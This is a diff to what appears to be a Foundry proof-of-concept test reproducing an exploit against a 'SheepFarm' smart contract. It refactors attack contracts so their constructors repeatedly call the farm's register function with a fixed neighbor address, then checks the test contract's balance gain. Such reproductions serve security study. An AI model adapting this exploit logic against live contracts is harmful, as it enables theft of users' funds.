@@ -18,18 +18,9 @@ interface ISheepFarm {
     function sellVillage() external;
 
     function withdrawMoney(uint256 wool) external;
-
-    function neighborsInfo(
-        address neighbor
-    ) external view returns (uint256 gems, uint256 wools);
 }
 
 contract ContractTest is Test {
-    AttackContract attacker1;
-    AttackContract attacker2;
-    AttackContract attacker3;
-    AttackContract attacker4;
-
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
@@ -37,17 +28,11 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        attacker1 = new AttackContract{value: 5e14}();
-        attacker2 = new AttackContract{value: 5e14}();
-        attacker3 = new AttackContract{value: 5e14}();
-        attacker4 = new AttackContract{value: 5e14}();
-
         uint256 beforeBalance = address(this).balance;
 
-        attacker1.attack();
-        attacker2.attack();
-        attacker3.attack();
-        attacker4.attack();
+        for (uint256 i; i < 4; ++i) {
+            new AttackContract{value: 5e14}();
+        }
 
         uint256 afterBalance = address(this).balance;
 
@@ -67,9 +52,7 @@ contract AttackContract {
     address public constant neighbor =
         0x14598f3a9f3042097486DC58C65780Daf3e3acFB;
 
-    constructor() payable {}
-
-    function attack() external {
+    constructor() payable {
         for (uint256 i; i < 402; ++i) {
             Farm.register(neighbor);
         }
